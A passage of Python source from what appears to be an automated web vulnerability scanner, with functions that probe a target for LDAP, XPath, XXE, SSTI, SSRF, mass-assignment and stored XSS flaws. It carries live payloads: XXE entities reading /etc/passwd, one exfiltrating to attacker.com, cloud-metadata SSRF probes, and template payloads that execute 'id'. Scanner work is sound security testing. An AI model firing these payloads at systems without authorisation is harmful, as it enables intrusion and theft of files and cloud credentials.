        return re.sub(r"[^a-z0-9]", "", name.lower())

    def _values_equal(observed: Any, expected: Any) -> bool:
        if isinstance(expected, bool):
            return observed is expected or str(observed).lower() == str(expected).lower()
        if isinstance(expected, (int, float)):
            try:
                return float(observed) == float(expected)
            except (TypeError, ValueError):
                return False
        return str(observed).lower() == str(expected).lower()

    def _json_field_matches(body: str, field: str, expected: Any) -> bool:
        if not body:
            return False
        try:
            parsed = json.loads(body)
        except Exception:
            return False
        target = _norm_key(field)

        def _walk(value: Any) -> bool:
            if isinstance(value, dict):
                for key, child in value.items():
                    if _norm_key(str(key)) == target and _values_equal(child, expected):
                        return True
                    if _walk(child):
                        return True
            elif isinstance(value, list):
                return any(_walk(child) for child in value[:10])
            return False

        return _walk(parsed)

    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
    baseline_body_args, baseline_header_args = _build_curl_body_args(base_body, content_type)
    baseline_cmd = [
        "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
    ] + baseline_header_args + auth_args + baseline_body_args + [
        "-w", "__SHAKERSCAN_MASS_ASSIGN__%{http_code}__SHAKERSCAN_MASS_ASSIGN__",
        url,
    ]
    baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
    baseline_out, baseline_status = _parse_meta(baseline_raw or "")
    if baseline_rc != 0:
        results["skipped"] = True
        results["reason"] = "baseline_request_failed"
        attempt["status"] = "partial"
        attempt["skip_reason"] = "baseline_request_failed"
        return results
    if baseline_status in (405, 415, 501):
        results["skipped"] = True
        results["reason"] = "method_or_content_type_not_supported"
        results["baseline_status"] = baseline_status
        attempt["status"] = "skipped"
        attempt["skip_reason"] = "method_or_content_type_not_supported"
        return results

    for field, value, category in dangerous_fields[:max(1, max_fields)]:
        results["fields_tested"] += 1
        attempt["attempted_params_count"] += 1
        test_body = copy.deepcopy(base_body)
        _set_nested_value(test_body, field, value, overwrite=True)
        test_body_args, test_header_args = _build_curl_body_args(test_body, content_type)
        test_cmd = [
            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
        ] + test_header_args + auth_args + test_body_args + [
            "-w", "__SHAKERSCAN_MASS_ASSIGN__%{http_code}__SHAKERSCAN_MASS_ASSIGN__",
            url,
        ]
        test_raw, _, test_rc = await run(test_cmd, timeout=15)
        if test_rc != 0:
            continue
        attempt["completed_params_count"] += 1
        test_out, test_status = _parse_meta(test_raw or "")
        test_lower = (test_out or "").lower()
        if test_status is None or test_status >= 300:
            continue
        if any(marker in test_lower for marker in rejection_markers):
            continue
        if not _json_field_matches(test_out, field, value):
            continue
        if _json_field_matches(baseline_out, field, value):
            continue

        results["vulnerable"] = True
        results["findings"].append({
            "parameter": field,
            "value": value,
            "category": category,
            "baseline_status": baseline_status,
            "payload_status": test_status,
            "evidence_type": "privileged_field_reflected",
            "response_snippet": test_out[:500] if test_out else "",
        })

    attempt["status"] = (
        "completed"
        if int(attempt.get("completed_params_count") or 0) >= int(attempt.get("attempted_params_count") or 0)
        else "partial"
    )
    return results


async def ldap_injection_test(
    url: str,
    params_to_test: list[str] | None = None,
    auth_session: Any | None = None,
    param_defaults: dict[str, Any] | None = None,
    max_params: int = 5,
    max_payloads: int = 6,
) -> dict[str, Any]:
    results: dict[str, Any] = {
        "vulnerable": False,
        "payloads_tested": [],
        "tested_params": [],
        "evidence": [],
    }
    payloads = [
        "*", "*)(&", "*)(uid=*", "*)(|(uid=*", "*))%00", ")(cn=))(|(cn=*",
        "*()|&'", "admin*", "admin*)((|userPassword=*)", "x' or name()='username' or 'x'='y"
    ]
    patterns = [
        r"javax\.naming\.(ldap\.)?LDAPException", r"com\.sun\.jndi\.ldap",
        r"ldap_bind:.*failed", r"ldap_search:.*failed", r"LDAP.*error.*0x\d+",
        r"Invalid DN syntax", r"malformed filter", r"LDAP injection detected"
    ]

    auth_args = get_auth_curl_args(auth_session)
    parsed = urllib.parse.urlparse(url)
    base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param_defaults:
        for name, value in param_defaults.items():
            if name not in base_params:
                base_params[name] = [str(value)]

    test_params = params_to_test or ["ldap"]
    if params_to_test:
        test_params = test_params[:max_params]
    payloads_to_use = payloads if params_to_test is None else payloads[:max_payloads]
    payloads_seen: set[str] = set()

    for param in test_params:
        if not param:
            continue
        results["tested_params"].append(param)
        for payload in payloads_to_use:
            payloads_seen.add(payload)
            params = dict(base_params)
            params[param] = [payload]
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "5"] + auth_args + [test_url],
                timeout=10
            )
            if rc == 0 and out:
                if "<!DOCTYPE" in out[:100] or "<html" in out[:100]:
                    continue
                for pattern in patterns:
                    if re.search(pattern, out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "response_snippet": out[:500],
                        })
                        break

    results["payloads_tested"] = sorted(payloads_seen)
    return results


async def xpath_injection_test(
    url: str,
    params_to_test: list[str] | None = None,
    auth_session: Any | None = None,
    param_defaults: dict[str, Any] | None = None,
    max_params: int = 5,
    max_payloads: int = 6,
) -> dict[str, Any]:
    """
    Test for XPath injection vulnerabilities using error-based detection.

    Reports only when XPath-specific error patterns are present in non-HTML responses.
    """
    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
    payloads = [
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "' or 1=1 or ''='",
        "')] | //* | 'a'='a",
        "' or contains(name(),'a') or 'a'='b",
        "' or string-length(name())=1 or 'a'='b",
        "' or count(//*)=1 or 'a'='a",
        "\" or count(//*)=1 or \"a\"=\"a",
    ]
    error_patterns = [
        r"XPathException",
        r"XPath\s+expression",
        r"XPathSyntaxError",
        r"XQuery\s+error",
        r"XSLT\s+error",
        r"Invalid\s+predicate",
        r"Unclosed\s+string",
        r"xmlXPathEval",
        r"javax\.xml\.xpath\.XPathExpressionException",
        r"org\.jaxen\.JaxenException",
        r"Undefined\s+function",
    ]

    def _is_html_response(content: str) -> bool:
        if not content:
            return False
        content_lower = content[:2000].lower()
        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
        return sum(1 for ind in html_indicators if ind in content_lower) >= 2

    auth_args = get_auth_curl_args(auth_session)
    parsed = urllib.parse.urlparse(url)
    base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param_defaults:
        for name, value in param_defaults.items():
            if name not in base_params:
                base_params[name] = [str(value)]

    test_params = params_to_test or ["xpath"]
    if params_to_test:
        test_params = test_params[:max_params]
    payloads_to_use = payloads if params_to_test is None else payloads[:max_payloads]
    payloads_seen: set[str] = set()

    for param in test_params:
        if not param:
            continue
        results.setdefault("tested_params", []).append(param)
        for payload in payloads_to_use:
            payloads_seen.add(payload)
            params = dict(base_params)
            params[param] = [payload]
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "6"] + auth_args + [test_url],
                timeout=10
            )
            if rc == 0 and out:
                if _is_html_response(out):
                    continue
                for pattern in error_patterns:
                    if re.search(pattern, out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "param": param,
                            "payload": payload,
                            "error_pattern": pattern,
                            "response_snippet": out[:500],
                            "url": test_url,
                        })
                        break

            # Light POST test for form-encoded payloads
            post_out, post_err, post_rc = await run(
                ["curl", "-sS", "-X", "POST", "-L", "-k", "--max-time", "6",
                 "-d", f"{urllib.parse.quote(param)}={urllib.parse.quote(payload)}"] + auth_args + [url],
                timeout=10
            )
            if post_rc == 0 and post_out:
                if _is_html_response(post_out):
                    continue
                for pattern in error_patterns:
                    if re.search(pattern, post_out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "param": param,
                            "payload": payload,
                            "error_pattern": pattern,
                            "response_snippet": post_out[:500],
                            "method": "POST",
                            "url": url,
                        })
                        break

    results["payloads_tested"] = sorted(payloads_seen)

    return results


async def xxe_injection_test(url: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
    xxe_payloads = [
        """<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>""",
        """<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">\n%eval;\n%exfil;\n]>\n<data>test</data>""",
        """<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n%xxe;\n]>""",
        """<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<data>&xxe;</data>""",
        """<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<image xlink:href=\"file:///etc/passwd\"/>\n</svg>""",
    ]
    for payload in xxe_payloads:
        out, err, rc = await run(["curl", "-sS", "-X", "POST", "-L", "-k", "--max-time", "10", "-H", "Content-Type: application/xml", "-d", payload, url], timeout=15)
        results["payloads_tested"].append(payload[:100] + "...")
        if rc == 0 and out:
            is_html = any(x in out[:500].lower() for x in ["<!doctype html", "<html", "text/html", "<!DOCTYPE html"])
            if not is_html:
                # FIX Issue #5: Improved XXE detection with stronger validation
                # Check for actual file content or SSRF, not just documentation keywords
                file_indicators = ["root:", "/bin/bash", "daemon:", "nobody:", "root:x:0:0"]
                ssrf_indicators = ["169.254.169.254", "ami-id", "instance-id", "iam/security-credentials"]

                has_file = any(ind in out for ind in file_indicators)
                has_ssrf = any(ind in out for ind in ssrf_indicators)

                # Only flag if we have strong evidence (file content OR SSRF)
                if (has_file or has_ssrf):
                    # Additional validation: check it's not documentation or tutorials
                    if not re.search(r'(tutorial|example|documentation|guide|blog|article)', out[:1000], re.I):
                        results["vulnerable"] = True
                        results["evidence"].append({"type": "xxe_detected", "payload_snippet": payload[:100], "response_snippet": out[:500]})
            if not is_html:
                for pattern in [r"External entity.*not allowed", r"Detected an entity reference loop", r"parser error.*Entity", r"DOCTYPE.*forbidden", r"XML.*error.*entity"]:
                    if re.search(pattern, out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["evidence"].append({"type": "xxe_blocked_but_processed", "description": "XXE payload was processed but blocked", "response_snippet": out[:500]})
                        break
    upload_endpoints = ["/upload", "/api/upload", "/files", "/import"]
    for endpoint in upload_endpoints:
        upload_url = urllib.parse.urljoin(url, endpoint)
        svg_payload = """<svg xmlns=\"http://www.w3.org/2000/svg\">\n<image href=\"file:///etc/passwd\"/>\n</svg>"""
        out, err, rc = await run(["curl", "-sS", "-X", "POST", "-L", "-k", "--max-time", "5", "-F", "file=@-;filename=test.svg", upload_url], timeout=10, input_text=svg_payload)
        if rc == 0 and "root:" in out:
            results["vulnerable"] = True
            results["evidence"].append({"type": "xxe_via_file_upload", "endpoint": endpoint, "description": "XXE via SVG file upload"})
    return results


async def ssti_test(
    url: str,
    params_to_test: list[str] | None = None,
    auth_session: Any | None = None,
    param_defaults: dict[str, Any] | None = None,
    max_params: int = 5,
    max_payloads: int = 6,
) -> dict[str, Any]:
    results: dict[str, Any] = {
        "vulnerable": False,
        "payloads_tested": [],
        "tested_params": [],
        "evidence": [],
    }
    payloads = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}",
        "{{config}}", "{{self.__dict__}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "#set($x=7*7)$x", "${T(java.lang.Runtime).getRuntime().exec('id')}"
    ]

    auth_args = get_auth_curl_args(auth_session)
    parsed = urllib.parse.urlparse(url)
    base_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if param_defaults:
        for name, value in param_defaults.items():
            if name not in base_params:
                base_params[name] = [str(value)]

    test_params = params_to_test or ["template"]
    if params_to_test:
        test_params = test_params[:max_params]
    payloads_to_use = payloads if params_to_test is None else payloads[:max_payloads]
    payloads_seen: set[str] = set()

    def _clean_template_response(content: str) -> str:
        clean = re.sub(r'<!--.*?-->', '', content or "", flags=re.DOTALL)
        clean = re.sub(r'<script.*?</script>', '', clean, flags=re.DOTALL | re.IGNORECASE)
        clean = re.sub(r'<style.*?</style>', '', clean, flags=re.DOTALL | re.IGNORECASE)
        clean = re.sub(r'<[^>]+>', ' ', clean)
        return re.sub(r'\s+', ' ', clean)

    def _looks_like_generic_html_shell(content: str) -> bool:
        sample = (content or "")[:2000].lower()
        if not sample:
            return False
        indicators = ("<!doctype html", "<html", "/_next/static/", "__next", "webpackchunk", "data-nextjs")
        return sum(1 for indicator in indicators if indicator in sample) >= 2

    for param in test_params:
        if not param:
            continue
        results["tested_params"].append(param)
        baseline_params = dict(base_params)
        baseline_params[param] = [f"ssti_baseline_{param}_12345"]
        baseline_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(baseline_params, doseq=True))
        )
        baseline_out = ""
        baseline_rc = 1
        baseline_out, _, baseline_rc = await run(
            ["curl", "-sS", "-L", "-k", "--max-time", "5"] + auth_args + [baseline_url],
            timeout=10
        )
        clean_baseline = _clean_template_response(baseline_out) if baseline_rc == 0 else ""
        for payload in payloads_to_use:
            payloads_seen.add(payload)
            params = dict(base_params)
            params[param] = [payload]
            test_query = urllib.parse.urlencode(params, doseq=True)
            test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "5"] + auth_args + [test_url],
                timeout=10
            )
            if rc == 0 and out:
                if "7*7" in payload and "49" in out:
                    clean_out = _clean_template_response(out)
                    response_changed = clean_out != clean_baseline
                    baseline_has_49 = bool(re.search(r'(?<![\w/])49(?![\w/])', clean_baseline))
                    output_has_standalone_49 = bool(re.search(r'(?<![\w/])49(?![\w/])', clean_out))
                    generic_shell = _looks_like_generic_html_shell(out)
                    literal_payload_reflected = payload in out
                    if (
                        response_changed
                        and output_has_standalone_49
                        and not baseline_has_49
                        and not literal_payload_reflected
                        and not generic_shell
                    ):
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "type": "math-evaluation",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "response_snippet": out[:500],
                            "baseline_url": baseline_url,
                        })
                elif not ("<!DOCTYPE" in out[:100] or "<html" in out[:100]):
                    if re.search(r"(jinja2\.exceptions\.|django\.template\.TemplateDoesNotExist|Twig[_\\]Error|TemplateProcessingException)", out, re.I):
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "type": "error-based",
                            "param": param,
                            "payload": payload,
                            "url": test_url,
                            "response_snippet": out[:500],
                        })

    results["payloads_tested"] = sorted(payloads_seen)
    return results


async def ldap_injection_test_json_body(
    url: str,
    method: str,
    params: list[str],
    auth_session: Any | None = None,
    body_template: Any | None = None,
    body_param_defaults: dict[str, Any] | None = None,
    content_type: str = "application/json",
    max_params: int = 4,
    max_payloads: int = 5,
) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
    if not params:
        return results
    if content_type and "json" not in content_type.lower():
        return results

    payloads = [
        "*", "*)(&", "*)(uid=*", "*)(|(uid=*", "*))%00", ")(cn=))(|(cn=*",
        "*()|&'", "admin*", "admin*)((|userPassword=*)", "x' or name()='username' or 'x'='y"
    ]
    error_patterns = [
        r"javax\.naming\.(ldap\.)?LDAPException", r"com\.sun\.jndi\.ldap",
        r"ldap_bind:.*failed", r"ldap_search:.*failed", r"LDAP.*error.*0x\d+",
        r"Invalid DN syntax", r"malformed filter", r"LDAP injection detected"
    ]

    def _is_html_response(content: str) -> bool:
        if not content:
            return False
        content_lower = content[:2000].lower()
        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
        return sum(1 for ind in html_indicators if ind in content_lower) >= 2

    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
    if isinstance(base_body, dict) and body_param_defaults:
        for k, v in body_param_defaults.items():
            base_body.setdefault(k, v)
    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
        for k, v in body_param_defaults.items():
            base_body[0].setdefault(k, v)

    payloads_seen: set[str] = set()
    for param in params[:max_params]:
        if not param:
            continue
        results["tested_params"].append(param)
        for payload in payloads[:max_payloads]:
            payloads_seen.add(payload)
            test_body = _apply_body_param(base_body, param, payload)
            body_args, header_args = _build_curl_body_args(test_body, content_type)
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
                timeout=12
            )
            if rc == 0 and out:
                if _is_html_response(out):
                    continue
                for pattern in error_patterns:
                    if re.search(pattern, out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["findings"].append({
                            "param": param,
                            "payload": payload,
                            "url": url,
                            "method": method,
                            "response_snippet": out[:500],
                        })
                        break

    results["payloads_tested"] = sorted(payloads_seen)
    return results


async def xpath_injection_test_json_body(
    url: str,
    method: str,
    params: list[str],
    auth_session: Any | None = None,
    body_template: Any | None = None,
    body_param_defaults: dict[str, Any] | None = None,
    content_type: str = "application/json",
    max_params: int = 4,
    max_payloads: int = 5,
) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
    if not params:
        return results
    if content_type and "json" not in content_type.lower():
        return results

    payloads = [
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "' or 1=1 or ''='",
        "')] | //* | 'a'='a",
        "' or contains(name(),'a') or 'a'='b",
        "' or string-length(name())=1 or 'a'='b",
        "' or count(//*)=1 or 'a'='a",
        "\" or count(//*)=1 or \"a\"=\"a",
    ]
    error_patterns = [
        r"XPathException",
        r"XPath\s+expression",
        r"XPathSyntaxError",
        r"XQuery\s+error",
        r"XSLT\s+error",
        r"Invalid\s+predicate",
        r"Unclosed\s+string",
        r"xmlXPathEval",
        r"javax\.xml\.xpath\.XPathExpressionException",
        r"org\.jaxen\.JaxenException",
        r"Undefined\s+function",
    ]

    def _is_html_response(content: str) -> bool:
        if not content:
            return False
        content_lower = content[:2000].lower()
        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
        return sum(1 for ind in html_indicators if ind in content_lower) >= 2

    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
    if isinstance(base_body, dict) and body_param_defaults:
        for k, v in body_param_defaults.items():
            base_body.setdefault(k, v)
    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
        for k, v in body_param_defaults.items():
            base_body[0].setdefault(k, v)

    payloads_seen: set[str] = set()
    for param in params[:max_params]:
        if not param:
            continue
        results["tested_params"].append(param)
        for payload in payloads[:max_payloads]:
            payloads_seen.add(payload)
            test_body = _apply_body_param(base_body, param, payload)
            body_args, header_args = _build_curl_body_args(test_body, content_type)
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
                timeout=12
            )
            if rc == 0 and out:
                if _is_html_response(out):
                    continue
                for pattern in error_patterns:
                    if re.search(pattern, out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["findings"].append({
                            "param": param,
                            "payload": payload,
                            "url": url,
                            "method": method,
                            "response_snippet": out[:500],
                        })
                        break

    results["payloads_tested"] = sorted(payloads_seen)
    return results


async def ssrf_injection_test_json_body(
    url: str,
    method: str,
    params: list[str],
    auth_session: Any | None = None,
    body_template: Any | None = None,
    body_param_defaults: dict[str, Any] | None = None,
    content_type: str = "application/json",
    max_params: int = 3,
    max_payloads: int = 3,
) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
    if not params:
        return results
    if content_type and "json" not in content_type.lower():
        return results

    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22",
        "file:///etc/passwd",
    ]
    file_indicators = ["root:", "/bin/bash", "daemon:", "nobody:", "root:x:0:0"]
    ssrf_indicators = ["169.254.169.254", "ami-id", "instance-id", "iam/security-credentials"]

    def _is_html_response(content: str) -> bool:
        if not content:
            return False
        content_lower = content[:2000].lower()
        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
        return sum(1 for ind in html_indicators if ind in content_lower) >= 2

    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
    if isinstance(base_body, dict) and body_param_defaults:
        for k, v in body_param_defaults.items():
            base_body.setdefault(k, v)
    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
        for k, v in body_param_defaults.items():
            base_body[0].setdefault(k, v)

    payloads_seen: set[str] = set()
    for param in params[:max_params]:
        if not param:
            continue
        results["tested_params"].append(param)
        for payload in payloads[:max_payloads]:
            payloads_seen.add(payload)
            test_body = _apply_body_param(base_body, param, payload)
            body_args, header_args = _build_curl_body_args(test_body, content_type)
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
                timeout=12
            )
            if rc == 0 and out:
                if _is_html_response(out):
                    continue
                if any(ind in out for ind in file_indicators) or any(ind in out for ind in ssrf_indicators):
                    results["vulnerable"] = True
                    results["findings"].append({
                        "param": param,
                        "payload": payload,
                        "url": url,
                        "method": method,
                        "response_snippet": out[:500],
                    })
                    break

    results["payloads_tested"] = sorted(payloads_seen)
    return results


async def xxe_injection_test_json_body(
    url: str,
    method: str,
    params: list[str],
    auth_session: Any | None = None,
    body_template: Any | None = None,
    body_param_defaults: dict[str, Any] | None = None,
    content_type: str = "application/json",
    max_params: int = 3,
    max_payloads: int = 2,
) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "findings": [], "tested_params": [], "payloads_tested": []}
    if not params:
        return results
    if content_type and "json" not in content_type.lower():
        return results

    payloads = [
        """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>""",
        """<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>""",
    ]
    file_indicators = ["root:", "/bin/bash", "daemon:", "nobody:", "root:x:0:0"]
    ssrf_indicators = ["169.254.169.254", "ami-id", "instance-id", "iam/security-credentials"]
    error_patterns = [
        r"External entity.*not allowed",
        r"Detected an entity reference loop",
        r"parser error.*Entity",
        r"DOCTYPE.*forbidden",
        r"XML.*error.*entity",
    ]

    def _is_html_response(content: str) -> bool:
        if not content:
            return False
        content_lower = content[:2000].lower()
        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
        return sum(1 for ind in html_indicators if ind in content_lower) >= 2

    def _strip_reflected_payload(content: str, payload: str) -> str:
        """Remove echoed payload forms before checking for XXE success markers."""
        variants = {payload}
        try:
            variants.add(json.dumps(payload)[1:-1])
        except Exception:
            pass
        variants.add(payload.replace('"', r'\"'))
        variants.add(urllib.parse.quote(payload, safe=""))
        variants.add(urllib.parse.quote_plus(payload))

        scrubbed = content
        for variant in sorted((v for v in variants if v), key=len, reverse=True):
            scrubbed = scrubbed.replace(variant, "")
        return scrubbed

    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})
    base_body = _build_body_template({"body_template": body_template}) if body_template is not None else {}
    if isinstance(base_body, dict) and body_param_defaults:
        for k, v in body_param_defaults.items():
            base_body.setdefault(k, v)
    if isinstance(base_body, list) and body_param_defaults and base_body and isinstance(base_body[0], dict):
        for k, v in body_param_defaults.items():
            base_body[0].setdefault(k, v)

    payloads_seen: set[str] = set()
    for param in params[:max_params]:
        if not param:
            continue
        results["tested_params"].append(param)
        for payload in payloads[:max_payloads]:
            payloads_seen.add(payload)
            test_body = _apply_body_param(base_body, param, payload)
            body_args, header_args = _build_curl_body_args(test_body, content_type)
            out, err, rc = await run(
                ["curl", "-sS", "-L", "-k", "--max-time", "8", "-X", method] + auth_args + header_args + body_args + [url],
                timeout=12
            )
            if rc == 0 and out:
                if _is_html_response(out):
                    continue
                signal_body = _strip_reflected_payload(out, payload)
                payload_reflected = signal_body != out
                has_file = any(ind in signal_body for ind in file_indicators)
                has_ssrf = any(ind in signal_body for ind in ssrf_indicators)
                has_error = any(re.search(pat, signal_body, re.IGNORECASE) for pat in error_patterns)
                if (has_file or has_ssrf or has_error):
                    results["vulnerable"] = True
                    results["findings"].append({
                        "param": param,
                        "payload": payload[:120],
                        "url": url,
                        "method": method,
                        "payload_reflected": payload_reflected,
                        "response_snippet": out[:500],
                    })
                    break

    results["payloads_tested"] = sorted(payloads_seen)
    return results


async def stored_xss_workflow(
    base_url: str,
    endpoints: list[dict[str, Any]],
    discovered_urls: list[str] | None = None,
    auth_session: Any | None = None,
    max_forms: int = 5,
    max_pages: int = 15,
) -> dict[str, Any]:
    """
    Attempt to detect stored XSS by submitting payloads via discovered POST endpoints
    and then checking other pages for unescaped payload reuse.
    """
    results: dict[str, Any] = {
        "vulnerable": False,
        "forms_tested": 0,
        "payloads_sent": 0,
        "findings": [],
        "evidence": [],
    }
    if not endpoints:
        return results

    marker = f"shakerxss{random.randint(10000, 99999)}"
    payloads = [
        f"<img src=x onerror=alert(1)>{marker}",
        f"\\\"><svg onload=alert(1)>{marker}",
    ]

    param_hints = {
        "comment", "message", "review", "feedback", "content", "body", "text",
        "description", "note", "title", "name", "post", "reply"
    }

    def _is_static(url: str) -> bool:
        ext = os.path.splitext(urllib.parse.urlparse(url).path.lower())[1]
        return ext in {".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".css", ".map", ".js", ".woff", ".woff2", ".ttf", ".eot"}

    def _in_scope(url: str) -> bool:
        if not url or not base_url:
            return False
        try:
            return urllib.parse.urlparse(url).netloc == urllib.parse.urlparse(base_url).netloc
        except Exception:
            return False

    urls_to_check = []
    if discovered_urls:
        urls_to_check = [u for u in discovered_urls if u and _in_scope(u) and not _is_static(u)]
    if base_url and base_url not in urls_to_check:
        urls_to_check.append(base_url)

    # Prioritize likely render pages
    keywords = ("comment", "review", "feedback", "message", "post", "blog", "profile", "user", "admin", "note")
    priority = [u for u in urls_to_check if any(k in u.lower() for k in keywords)]
    remaining = [u for u in urls_to_check if u not in priority]
    pages_to_check = (priority + remaining)[:max_pages]

    auth_args = _filter_curl_headers(get_auth_curl_args(auth_session), {"content-type"})

    def _coerce_param_list(raw: Any) -> list[str]:
        if isinstance(raw, dict):
            return [str(k) for k in raw.keys() if k]
        if isinstance(raw, (list, tuple, set)):
            return [str(v) for v in raw if v]
        if isinstance(raw, str):
            return [raw] if raw else []
        return []

    # Candidate POST endpoints
    form_candidates = [
        ep for ep in endpoints
        if (ep.get("method") or "GET").upper() in ("POST", "PUT", "PATCH")
        and ep.get("body_params")
        and "multipart/form-data" not in (ep.get("content_type") or "").lower()
    ]
    if not form_candidates:
        return results

    for endpoint in form_candidates[:max_forms]:
        method = (endpoint.get("method") or "POST").upper()
        url = endpoint.get("url")
        if not url:
            continue
        body_params = _coerce_param_list(endpoint.get("body_params") or endpoint.get("params"))
        if not body_params:
            continue
        content_type = endpoint.get("content_type") or "application/json"
        base_body = _build_body_template(endpoint)
        defaults = endpoint.get("body_param_defaults") or {}
        if isinstance(base_body, dict) and defaults:
            for k, v in defaults.items():
                base_body.setdefault(k, v)
        if isinstance(base_body, list) and defaults and base_body and isinstance(base_body[0], dict):
            for k, v in defaults.items():
                base_body[0].setdefault(k, v)

        # Prefer text-like fields
        hint_params = [p for p in body_params if p.lower() in param_hints]
        target_params = hint_params if hint_params else body_params[:2]

        for param in target_params:
            for payload in payloads:
                test_body = _apply_body_param(base_body, param, payload)
                body_args, header_args = _build_curl_body_args(test_body, content_type)
                out, err, rc = await run(
                    ["curl", "-sS", "-L", "-k", "--max-time", "10", "-X", method] + auth_args + header_args + body_args + [url],
                    timeout=15
                )
                results["payloads_sent"] += 1
                results["forms_tested"] += 1

                # After submit, check pages for stored payload
                for page_url in pages_to_check:
                    try:
                        page_out, _, page_rc = await run(
                            ["curl", "-sS", "-L", "-k", "--max-time", "10"] + auth_args + [page_url],
                            timeout=12
                        )
                    except Exception:
                        continue
                    if page_rc != 0 or not page_out:
                        continue
                    if marker not in page_out:
                        continue
                    # Favor exact payload reflection
                    payload_reflected = payload in page_out
                    idx = page_out.find(marker)
                    snippet = page_out[max(0, idx - 80): idx + 120] if idx >= 0 else page_out[:200]
                    results["vulnerable"] = True
                    results["findings"].append({
                        "injection_url": url,
                        "stored_url": page_url,
                        "param": param,
                        "payload": payload,
                        "payload_reflected": payload_reflected,
                        "snippet": snippet,
                        "method": method,
                        "severity": "high" if payload_reflected else "medium",
                    })
                    results["evidence"].append({
                        "stored_url": page_url,
                        "snippet": snippet,
                    })
                    break
            if results["vulnerable"]:
                break
        if results["vulnerable"]:
            break

    return results


async def jwt_vulnerability_test(url: str, sample_token: str | None = None) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "issues": [], "evidence": []}
    if not sample_token:
